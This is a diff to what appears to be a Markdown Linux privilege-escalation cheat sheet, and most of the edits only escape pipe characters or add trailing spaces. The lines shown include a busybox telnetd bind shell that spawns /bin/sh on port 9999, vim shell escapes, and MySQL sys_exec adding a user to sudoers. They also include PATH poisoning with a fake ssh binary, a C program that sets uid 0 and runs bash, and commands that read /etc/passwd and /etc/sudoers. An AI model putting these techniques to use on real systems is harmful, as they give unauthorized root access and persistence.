@@ -44,7 +44,7 @@ From within tcpdump
 
 From busybox
 
-> $ /bin/busybox telnetd -|/bin/sh -p9999
+> $ /bin/busybox telnetd - &#124; /bin/sh -p9999
 
 > :!bash
 > :set shell=/bin/bash:shell
@@ -90,7 +90,7 @@ Use netstat to find other machines connected
 
 Command to skip ignored lines in config files
 
-> $ alias nonempty="egrep -v '^[ \t]*#|^$'"
+> $ alias nonempty="egrep -v '^[ \t]*#&#124;^$'"
 
 If Mysql is running as root, you can run commands using sys_exec(). For instance, to add user to sudoers:
 
@@ -188,10 +188,10 @@ if you can just change PATH, the following will add a poisoned ssh binary:
 
 Generating SUID C Shell for /bin/bash
 
-> int main(void){
->     setresuid(0, 0, 0);
->     system("/bin/bash");
-> }
+> int main(void){  
+>     setresuid(0, 0, 0);  
+>     system("/bin/bash");  
+> }  
 
 Without interactive shell
 
@@ -223,7 +223,7 @@ compile exploit fix error
 
 Find other uses in the system
 
-> $id; who; w; last; cat /etc/passwd | cut -d: -f1; echo 'sudoers:'; cat /etc/sudoers; sudo -l
+> $id; who; w; last; cat /etc/passwd &#124; cut -d: -f1; echo 'sudoers:'; cat /etc/sudoers; sudo -l
 
 World readable/writable files:
 
